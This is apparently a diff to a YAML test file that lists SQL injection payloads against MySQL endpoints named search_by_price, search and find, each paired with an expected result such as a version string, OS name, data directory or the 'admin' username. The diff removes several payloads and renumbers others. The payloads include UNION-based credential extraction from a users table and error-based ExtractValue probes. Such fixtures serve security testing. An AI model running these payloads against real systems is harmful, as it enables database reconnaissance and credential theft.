@@ -15,9 +15,6 @@ search_by_price:
       payload: "1 UNION SELECT NULL,version()-- -"
       expected: "5.7.42"
     attack_02:
-      payload: "1 UNION SELECT NULL, NULL,@@version-- -"
-      expected: "5.7.42"
-    attack_03:
     # This can help with mapping the filesystem
       # 1%20UNION%20SELECT%20NULL%2C%40%40global.version_compile_os--%20-
       payload: "1 UNION SELECT NULL,@@global.version_compile_os-- -"
@@ -52,17 +49,7 @@ search:
     attack_01:
       payload: "%' UNION SELECT NULL,version()-- -"
       expected: "5.7.42"
-    # attack_02:
-    # # This can help with mapping the filesystem
-    #   # %25'%20UNION%20SELECT%20NULL%2C%40%40global.version_compile_os--%20-
-    #   payload: "%' UNION SELECT NULL,@@global.version_compile_os-- -"
-    #   expected: "Linux"
-    # attack_03:
-    # # This can help with mapping the filesystem
-    #   # %25'%20UNION%20SELECT%20NULL%2C%40%40datadir--%20-
-    #   payload: "%' UNION SELECT NULL,@@datadir-- -"
-    #   expected: "/var/lib/mysql/"
-    attack_04:
+    attack_02:
     # %25'%20UNION%20SELECT%20username%2C%20password%20FROM%20users%20--%20-
       payload: "%' UNION SELECT username, password FROM users -- -"
       expected: "admin"
@@ -109,12 +96,6 @@ find:
     attack_02:
       payload: "' AND ExtractValue(0, CONCAT( 0x5c, @@version)) -- -"
       expected: "5.7.42"
-    # attack_03:
-    #   payload: "' AND ExtractValue(0, CONCAT( 0x5c, @@datadir)) -- -"
-    #   expected: "/var/lib/mysql/"
-    # attack_04:
-    #   payload: "' AND ExtractValue(0, CONCAT( 0x5c, @@global.version_compile_os)) -- -"
-    #   expected: "Linux"
 
 # What about buffer overflow?
 # Blind SQL injection e.g. SELECT * FROM users WHERE id=$id 
